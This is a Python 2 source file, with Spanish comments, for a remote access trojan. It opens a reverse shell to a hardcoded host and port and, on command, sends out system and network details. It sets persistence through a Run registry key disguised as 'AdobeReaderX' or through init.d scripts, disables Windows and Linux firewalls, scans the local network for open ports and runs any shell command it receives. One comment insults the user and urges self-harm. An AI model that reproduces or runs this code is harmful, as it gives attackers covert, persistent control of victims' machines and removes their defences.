# -*- coding: UTF-8 -*-

import os
import sys
import platform
import socket as socket
import subprocess
import getpass
import uuid
import urllib
import time
import ctypes
try:
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
except:
    pass

#SYSTEM-----SHELL INVERSA                       X
#   |    |__OS INFO                             V
#   |
#   |
#   |---WINDOWS
#   |      |---PERSISTENCIA                     V
#   |      |---FIREWALL  (AS ADMIN)             V
#   |      |___NET SCANNER                      V
#   |
#   |---LINUX
#         |---PERSISTENCIA                      V                               
#         |---FIREWALL/IPTABLES/UFW (AS ADMIN)  V
#         |___NET SCANNER                       V
#   

#####################################################################################################################################
#####################################################################################################################################
#####################################################################################################################################

#########
#GENERAL#
#########

def System():
    if sys.platform.startswith('win32') or sys.platform.startswith('cygwin'):
        PLAT_SYS = 'windows'
    elif sys.platform.startswith('linux'):
        PLAT_SYS = 'linux'
    else:
        PLAT_SYS = 'unknown'
    return PLAT_SYS



def os_info():
    #SISTEMA OPERATIVO
    sys_platform = platform.platform()
    proces    = platform.processor()
    arch = platform.architecture()[0]
    #USUARIO EN SESIÓN
    user = getpass.getuser()
    #RED
    hostname    = socket.gethostname()
    fqdn        = socket.getfqdn()          #Nombre Domin. asociado
    internal_ip = socket.gethostbyname(hostname)
    raw_mac     = uuid.getnode()
    mac         = ':'.join(('%012X' % raw_mac)[i:i+2] for i in range(0, 12, 2))
    #IP EXTERNA
    ex_ip_grab = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw',
                   'wtfismyip.com/text' ]
    external_ip = ''
    #PRUEBA TODAS LAS URLS DE LA LISTA
    for url in ex_ip_grab:
        try:
            #ABRE LA URL SELECCIONADA Y DEVUELVE LA INFORMACIÓN QUE RECIBE ELIMINANDO EL ESPACIADO EN BLANCO
            external_ip = urllib.urlopen('http://'+url).read().rstrip() #XXX.YYY.ZZZ.KKK
        except IOError:
            pass
        #SI NO HAY ERRORES EN LA IP Y ESTÁ COMPRENDIDA ENTRE 7 Y 15 (INCLUSIVES) DÍGITOS, TERMINA EL BUCLE DE LAS URLS
        if external_ip and (6 < len(external_ip) < 16):
            break

    # DATATIME DEL DISPOSITIVO
    dt = time.strftime('%a, %d %b %Y %H:%M:%S {}'.format(time.tzname[0]),
         time.localtime())
    all_val = [sys_platform, proces, arch, user, hostname, mac, internal_ip, external_ip, dt]
    all=''
    for i in all_val:
        all=all+' '+i
    return all
    



#####################################################################################################################################
#####################################################################################################################################
#####################################################################################################################################

#########
#WINDOWS#
#########

def windows_persistence():
    tempdir = '%TEMP%'
    fileName = sys.argv[0]    #argv[0] INDICA EL NOMBRE DEL SCRIPT EN EJECUCIÓN
    dir,file = os.path.split(fileName)
#    print dir      C:\USUARIO\BLA\BLA
#    print file     ARCHIVO.PY
    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'

    #COPIA EL SCRIPT EN EJECUCIÓN A %TEMP%:
    try:
        os.system('copy %s %s'%(fileName, tempdir))
        bin_path = sys.executable
    except:
        pass

    try:
        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, 'AdobeReaderX', 0, _winreg.REG_SZ,(r"%TEMP%"+file))
        _winreg.CloseKey(reg_key)
        #print 'HKCU Run registry key applied on Software\Microsoft\Windows\CurrentVersion\Run'
        return True

    except WindowsError:
        #print 'HKCU Run registry key failed on Software\Microsoft\Windows\CurrentVersion\Run'
        return False



def windows_firewall():
    is_admin = ctypes.windll.shell32.IsUserAnAdmin()

    if is_admin == 1:
        try:
            subprocess.check_call('netsh.exe advfirewall set allprofiles state off')
            return True
        except:
            return False
            #print 'No se ha podido realizar'



def windows_scanner():
    #IP INTERNA
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0].split('.')
    s.close()


    #RANGO DE IP'S (192.168.X.1-255)
    ips = []          #Rango de ip's
    ips_on = []       #IP's de dispositivos encendidos
    ip_port_on = []   #Puertos abiertos de IP's de dispositivos encendidos
    PORTS = [ 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 179, 443, 445,
    514, 993, 995, 1723, 3306, 3389, 5900, 8000, 8080, 8443, 8888 ]

    for i in range(1,256):
        ip_full = str(ip[0]+'.'+ip[1]+'.'+ip[2]+'.'+str(i))
        ips.append(ip_full)

    for ip in ips:
        print 'Scanning ',ip
        output = subprocess.Popen(["ping", "-n ", "1", ip],stdout = subprocess.PIPE).communicate()[0]
        #print output
        if ('inaccesible in output'):
            pass
        else:
            ips_on.append(ip)


    #print ips_on

    for ip_on in ips_on:
        for port in PORTS:
            try:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip_on,port))
                print 'IP ',ip_on,'Puerto ',port, ' abierto'
                ip_port_on.append(ip_on+'_'+str(port))
            except:
                #print 'Puerto ',port, ' cerrado'
                pass
            finally:
                s.close()
    #print ip_port_on
    return ip_port_on



#####################################################################################################################################
#####################################################################################################################################
#####################################################################################################################################

#######
#LINUX#
#######
def linux_scanner():
    ips = []
    ips_on = []
    ip_port_on = []
    PORTS = [ 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 179, 443, 445,
    514, 993, 995, 1723, 3306, 3389, 5900, 8000, 8080, 8443, 8888 ]
    #IP INTERNA
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0].split('.')
    s.close()
    #RANGO DE IP'S (192.168.X.1-255)
    for i in range(1,5):
        ip_full = str(ip[0]+'.'+ip[1]+'.'+ip[2]+'.'+str(i))
        ips.append(ip_full)

    for ip in ips:
        res = subprocess.call(['ping', '-c', '1', ip],stdout = subprocess.PIPE)
        #OK CONNECTION
        if res == 0:
            ips_on.append(ip)
            print (ip,' Online')
        #NO RESPONSE
        elif res == 2:
            print (ip,' Offline')
            continue
        #FAILED CONNECTION
        else:
            print (ip,' Offline')
            continue

    #print ips_on

    for ip_on in ips_on:
        for port in PORTS:
            try:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip_on,port))
                print 'IP ',ip_on,'Puerto ',port, ' abierto'
                ip_port_on.append(ip_on+'_'+str(port))
            except:
                #print 'Puerto ',port, ' cerrado'
                pass
            finally:
                s.close()
    #print ip_port_on
    return ip_port_on



def linux_firewall():
    is_admin = os.getuid()
    if is_admin == 0:
        try:
            subprocess.check_call('sudo systemctl stop firewalld && systemctl stop iptables && systemctl stop ufw')
            #print 'Firewall, iptables and ufw disabled succesfully.'
            return True
        except:
            #print "Impossible disable firewall and other security measures"
            return False
            pass

    else:
        #print 'You, normie, are not abled to disable nothing. Try to kill yourself.'
        return False



def linux_persistence():
    initdir = '/etc/init.d/'
    fileName = sys.argv[0]    #argv[0] INDICA EL NOMBRE DEL SCRIPT EN EJECUCIÓN
    dir,file = os.path.split(fileName)
    try:
        os.system('sudo cp %s %s'%(fileName, initdir))
        os.system('sudo chmod +x /etc/init.d/%s'%(file))
        os.system('sudo update-rc.d %s defaults'%(file))
        return True
    except:
        #print 'Not as admin.'
        return False

#####################################################################################################################################
#####################################################################################################################################
#####################################################################################################################################

#######
#SHELL#
#######
def shell():
    RHOST = '127.0.0.1'
    RPORT = 443
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    try:
        while True:
            data = s.recv(1024)
    #####################################################################################################################################
            if data == 'quit':
                s.close()
    #####################################################################################################################################
            elif data == 'os info':
                os_information = str(os_info())
                s.send(os_information)
    #####################################################################################################################################
            elif data == 'persistence':
                if System() == 'windows':
                    if windows_persistence() == True:
                        s.send('Persistencia completada')
                    else:
                        s.send('No se pudo realizar la persistencia')
                elif System() == 'linux':
                    if linux_persistence() == True:
                        s.send('Persistencia completada')
                    else:
                        s.send('No se pudo realizar la persistencia')
                else:
                    pass
    #####################################################################################################################################
            elif data == 'firewall':
                if System() == 'windows':
                    if windows_firewall() == True:
                        s.send('Se desactivó satisfactoriamente')
                    else:
                        s.send('No se pudo desactivar')
                elif System() == 'linux':
                    if linux_firewall() == True:
                        s.send('Se desactivó satisfactoriamente')
                    else:
                        s.send('No se pudo desactivar')
                else:
                    pass
    #####################################################################################################################################            
            elif data == 'scanner':
                if System() == 'windows':
                    result_scan=str(windows_scanner())
                    s.send(result_scan)
                elif System() == 'linux':
                    result_scan=str(linux_scanner())
                    s.send(result_scan)
                else:
                    pass
    #####################################################################################################################################
            else:
                comm = subprocess.Popen(str(data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
    #####################################################################################################################################
            try:
                s.send(STDOUT+STDERR)
            except:
                pass
        s.close()
    except:
        sys.exit
        pass

shell()
